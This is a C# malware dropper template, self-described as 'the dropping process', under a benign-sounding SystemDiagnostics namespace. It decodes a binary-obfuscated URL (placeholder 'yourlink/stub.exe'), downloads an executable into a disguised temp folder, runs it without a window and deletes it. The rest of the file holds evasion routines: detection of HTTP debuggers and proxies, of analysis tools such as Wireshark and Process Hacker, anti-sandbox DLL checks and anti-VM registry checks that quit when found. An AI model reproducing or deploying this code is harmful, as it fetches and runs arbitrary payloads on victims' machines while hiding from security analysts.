using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;


//THIS IS THE DROPPING PROCESS
namespace SystemDiagnostics
{
	public class 有效載荷
	{
		public static void 裝載機()
		{
			string dllSourceStream = "CONVERT (Ex: http://yourlink/stub.exe) TO BINARY - (https://www.rapidtables.com/convert/number/ascii-to-binary.html)";
			string dllSourceStream2 = "CONVERT (Ex: $RarlV\\stub.exe) TO BINARY - (https://www.rapidtables.com/convert/number/ascii-to-binary.html)";
			Directory.CreateDirectory(Path.GetTempPath() + "$RarlV");
			new WebClient().DownloadFile(有效載荷.CosturaDecryptDll(dllSourceStream), Path.GetTempPath() + 有效載荷.CosturaDecryptDll(dllSourceStream2));
			bool flag = File.Exists(Path.GetTempPath() + 有效載荷.CosturaDecryptDll(dllSourceStream2));
			if (flag)
			{
				Process process = new Process();
				process.StartInfo.FileName = Path.GetTempPath() + 有效載荷.CosturaDecryptDll(dllSourceStream2);
				process.StartInfo.RedirectStandardInput = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				process.Start();
				process.WaitForExit();
				File.Delete(Path.GetTempPath() + 有效載荷.CosturaDecryptDll(dllSourceStream2));
			}
		}

		public static string CosturaDecryptDll(string DllSourceStream)
		{
			string text = Regex.Replace(DllSourceStream, "[^01]", "");
			byte[] array = new byte[text.Length / 8 - 1 + 1];
			for (int i = 0; i <= array.Length - 1; i++)
			{
				array[i] = Convert.ToByte(text.Substring(i * 8, 8), 2);
			}
			return Encoding.ASCII.GetString(array);
		}

		[DllImport("kernel32.dll", SetLastError = true)]
		internal static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		internal static extern bool GetModuleHandleEx(uint dwFlags, string lpModuleName, out IntPtr phModule);

		public static bool WebSniffers()
		{
			ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls);
			WebRequest.DefaultWebProxy = new WebProxy();
			WebRequest.DefaultWebProxy = new WebProxy();
			return 有效載荷.GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero || 有效載荷.GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero || 有效載荷.GetModuleHandle("RestSharp.dll") != IntPtr.Zero || 有效載荷.GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero;
		}

		//Some AntiProcesses
		public static bool Processes()
		{
			Process[] processes = Process.GetProcesses();
			string[] selectedProcessList = new string[]
			{
				"processhacker",
				"netstat",
				"netmon",
				"tcpview",
				"wireshark",
				"filemon",
				"regmon",
				"cain"
			};
			return processes.Any((Process process) => selectedProcessList.Contains(process.ProcessName.ToLower()));
		}

		//Anti Sandbox
		public static bool Sand()
		{
			return new string[]
			{
				"SbieDll",
				"SxIn",
				"Sf2",
				"snxhk",
				"cmdvrt32"
			}.Any((string dll) => 有效載荷.GetModuleHandle(dll + ".dll").ToInt32() != 0);
		}


		//AntiVM
		public static void DetectRegistry()
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				"vmware",
				"virtualbox",
				"vbox",
				"qemu",
				"xen"
			};
			string[] array = new string[]
			{
				"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier",
				"SYSTEM\\CurrentControlSet\\Enum\\SCSI\\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
				"SYSTEM\\CurrentControlSet\\Control\\CriticalDeviceDatabase\\root#vmwvmcihostdev",
				"SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers",
				"SOFTWARE\\VMWare, Inc.\\VMWare Tools",
				"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
				"HARDWARE\\ACPI\\DSDT\\VBOX_"
			};
			string[] array2 = new string[]
			{
				"SYSTEM\\ControlSet001\\Services\\Disk\\Enum\\0",
				"HARDWARE\\Description\\System\\SystemBiosInformation",
				"HARDWARE\\Description\\System\\VideoBiosVersion",
				"HARDWARE\\Description\\System\\SystemManufacturer",
				"HARDWARE\\Description\\System\\SystemProductName",
				"HARDWARE\\Description\\System\\Logical Unit Id 0"
			};
			foreach (string text in array)
			{
				bool flag = Registry.LocalMachine.OpenSubKey(text, false) != null;
				if (flag)
				{
					list.Add("HKLM:\\" + text);
				}
			}
			foreach (string text2 in array2)
			{
				string name = new DirectoryInfo(text2).Name;
				string text3 = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(text2), false).GetValue(name);
				foreach (string text4 in list2)
				{
					bool flag2 = !string.IsNullOrEmpty(text3) && text3.ToLower().Contains(text4.ToLower());
					if (flag2)
					{
						list.Add("HKLM:\\" + text2 + " => " + text3);
					}
				}
			}
			bool flag3 = list.Count == 0;
			if (!flag3)
			{
				Environment.Exit(0);
			}
		}
	}
}
